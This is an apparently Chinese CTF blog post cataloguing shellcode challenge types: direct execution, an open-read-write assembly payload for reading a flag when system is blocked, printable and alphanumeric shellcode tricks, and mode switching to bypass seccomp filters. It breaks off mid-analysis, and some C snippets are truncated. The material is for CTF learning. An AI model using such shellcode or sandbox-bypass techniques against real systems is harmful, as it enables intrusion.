* * *
title: shellcode 的艺术  
tags: pwn
* * *
这里总结一下shellcode的各种类型
## 一、直接调用
    #include 
    int main(int argc, char const *argv[])
    {
        char s[0x500];
        gets(s);
        ((void(*)(void))s)();
        return 0;
    }
直接执行shellcode，考查对shellcode的编写能力，pwntool可以直接生成`shellcraft.sh()`，没什么难度
## 二、禁用了system
参考pwnable.tw的orw，这种不能直接get shell，但是可以编写shellcode实现`fp = open("flag")
,read(fp,buf,0x30),write(1,buf,0x30)`来读取flag
    #32位
    payload = '''
    /*fp = open("/home/orw/flag")*/
    push 0x00006761
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    mov eax,0x5
    mov ebx,esp
    xor ecx,ecx
    int 0x80
    /*read(fd,buf,0x100)*/
    mov ebx,eax
    mov ecx,esp
    mov edx,0x30
    mov eax,0x3
    int 0x80
    /*write(1,buf,0x100)*/
    mov ebx,0x1
    mov eax,0x4
    int 0x80
    '''
## 三、限制字符
像这样的
    // gcc -m64 -z execstack -fPIE -pie -z now chall3.c -o chall3
    int main() {
        char buf[0x400];
        int n, i;
        n = read(0, buf, 0x400);
        if (n  126) return 0;
        }
        ((void(*)(void))buf)();
    }
限制了shellcode为可打印字符，也就是说现在的shellcode中不能出现不可见字符，那么能用的汇编语句就大大减少了，如32位的`int
0x80`，64位的`syscall`都不能直接输入，那怎么办呢，参考大牛的总结，此类题目可用到的汇编指令如下 ：
    1.数据传送:
    push/pop eax…
    pusha/popa
    2.算术运算:
    inc/dec eax…
    sub al, 立即数
    sub byte ptr [eax… + 立即数], al dl…
    sub byte ptr [eax… + 立即数], ah dh…
    sub dword ptr [eax… + 立即数], esi edi
    sub word ptr [eax… + 立即数], si di
    sub al dl…, byte ptr [eax… + 立即数]
    sub ah dh…, byte ptr [eax… + 立即数]
    sub esi edi, dword ptr [eax… + 立即数]
    sub si di, word ptr [eax… + 立即数]
    3.逻辑运算:
    and al, 立即数
    and dword ptr [eax… + 立即数], esi edi
    and word ptr [eax… + 立即数], si di
    and ah dh…, byte ptr [ecx edx… + 立即数]
    and esi edi, dword ptr [eax… + 立即数]
    and si di, word ptr [eax… + 立即数]
    xor al, 立即数
    xor byte ptr [eax… + 立即数], al dl…
    xor byte ptr [eax… + 立即数], ah dh…
    xor dword ptr [eax… + 立即数], esi edi
    xor word ptr [eax… + 立即数], si di
    xor al dl…, byte ptr [eax… + 立即数]
    xor ah dh…, byte ptr [eax… + 立即数]
    xor esi edi, dword ptr [eax… + 立即数]
    xor si di, word ptr [eax… + 立即数]
    4.比较指令:
    cmp al, 立即数
    cmp byte ptr [eax… + 立即数], al dl…
    cmp byte ptr [eax… + 立即数], ah dh…
    cmp dword ptr [eax… + 立即数], esi edi
    cmp word ptr [eax… + 立即数], si di
    cmp al dl…, byte ptr [eax… + 立即数]
    cmp ah dh…, byte ptr [eax… + 立即数]
    cmp esi edi, dword ptr [eax… + 立即数]
    cmp si di, word ptr [eax… + 立即数]
    5.转移指令:
    push 56h
    pop eax
    cmp al, 43h
    jnz lable
     jmp lable
    6.交换al, ah
    push eax
    xor ah, byte ptr [esp] // ah ^= al
    xor byte ptr [esp], ah // al ^= ah
    xor ah, byte ptr [esp] // ah ^= al
    pop eax
    7.清零:
    push 44h
    pop eax
    sub al, 44h ; eax = 0
    push esi
    push esp
    pop eax
    xor [eax], esi ; esi = 0
所以考查的是我们用上面有限的汇编指令编写出可用的shellcode，基本思想：`mov a,b 用 push b;pop a替换;`而像`int 0x80
; syscall`这种则通过`xor sub and inc dec`运算来操作shellcode使之变成我们要的指令；
参数题目`pwnable.tw的death_note` 具体[wp](https://n0va-scy.github.io/2019/07/03/pwnable.tw/)
不过还是有工具可以生成可打印[shellcode](https://xz.aliyun.com/t/5662)
x86可以msf内置的encoder，x64用github上的[shellcode_encoder](https://github.com/ecx86/shellcode_encoder)
但是个人觉得，，工具有点局限，并不是万能的
## 四、字符限制范围更小
上面的字符限制还是可见字符，但是还可以继续限制到`[A-Z],[a-z],[0-9]`也就是字母和数字
像这样
    // gcc -m32 -z execstack -fPIE -pie -z now chall2.c -o chall2
    int main() {
        char buf[0x200];
        int n, i;
        n = read(0, buf, 0x200);
        if (n = 65 && buf[i] = 48 && buf[i] 
这里主要介绍在shellcode的编写：其主要思想就是通过调用32位的open来绕过，因为程序只是对64位的代码做限制，而通过写32位的shellcode能到达到open的目的，以32位的模式运行。
（骚操作，通过retfq切换模式），下面会以一道倒是来详细分析这种做法。
## 六、禁用了system和open，还限制了shellcode字符
这种情况可以说是我目前见到的最恶心的shellcode了，这就是来自ex师傅的shellcode题目
接下来详细分析一下这道题
    $ seccomp-tools dump ./shellcode 
    ---------- Shellcode ----------     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000000  A = sys_number
     0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008
     0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008
     0003: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0008
     0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008
     0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008
     0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008
     0007: 0x06 0x00 0x00 0x00000000  return KILL
     0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
查看一下沙箱发现，只允许6个函数，但是没有open，不过有mmap，并不知道有什么用，先放着
IDA看一下程序